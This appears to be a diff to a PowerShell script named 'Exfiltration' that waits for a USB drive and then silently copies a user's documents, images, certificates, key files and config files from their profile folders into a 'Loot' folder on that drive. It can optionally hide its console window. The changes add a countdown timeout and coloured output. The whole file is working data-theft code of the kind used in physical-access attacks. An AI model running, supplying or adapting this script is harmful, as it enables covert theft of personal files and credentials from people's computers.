@@ -12,34 +12,44 @@ USAGE
 #>
 
 [Console]::BackgroundColor = "Black"
-[Console]::SetWindowSize(78, 30)
+[Console]::SetWindowSize(57, 5)
 [Console]::Title = "Exfiltration"
 Clear-Host
 
 $hidden = Read-Host "Would you like to hide this console window? (Y/N)"
 $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
 $count = $removableDrives.count
-Write-Host "Connect a Device." 
+$i = 10
 
-While ($count -eq $removableDrives.count){
+While (($count -eq $removableDrives.count) -or ($i -gt 0)){
+    cls
+    Write-Host "Connect a Device.. ($i)" -ForegroundColor Yellow
     $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
     sleep 1
+    $i--
+    if ($i -eq 0 ){
+        Write-Host "Timeout! Exiting" -ForegroundColor Red
+        sleep 1
+        exit
+    }
 }
+
+[Console]::SetWindowSize(80, 30)
 
 $drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
 $driveLetter = $drive.DeviceID
-Write-Host "Loot Drive Set To : $driveLetter/"
+Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
 $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
 $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
 $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"
 
 if (-not (Test-Path -Path $destinationPath)) {
     New-Item -ItemType Directory -Path $destinationPath -Force
-    Write-Host "New Folder Created : $destinationPath"
+    Write-Host "New Folder Created : $destinationPath"  -ForegroundColor Green
 }
 
 If ($hidden -eq 'y'){
-    Write-Host "Hiding the Window.."
+    Write-Host "Hiding the Window.."  -ForegroundColor Red
     sleep 1
     $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
     add-type -name win -member $Import -namespace native;
@@ -47,14 +57,14 @@ If ($hidden -eq 'y'){
 }
 
 foreach ($folder in $foldersToSearch) {
-    Write-Host "Searching in $folder"
+    Write-Host "Searching in $folder"  -ForegroundColor Yellow
     
     foreach ($extension in $fileExtensions) {
         $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File
 
         foreach ($file in $files) {
             $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
-            Write-Host "Copying $($file.FullName) to $($destinationFile)"
+            Write-Host "Copying $($file.FullName) to $($destinationFile)"  -ForegroundColor Gray
             Copy-Item -Path $file.FullName -Destination $destinationFile -Force
         }
     }
@@ -63,6 +73,5 @@ foreach ($folder in $foldersToSearch) {
         msg.exe * "File Exfiltration Complete"
     }
     else{
-        Write-Host "File Exfiltration Complete"
+        Write-Host "File Exfiltration Complete" -ForegroundColor Green
     }
-
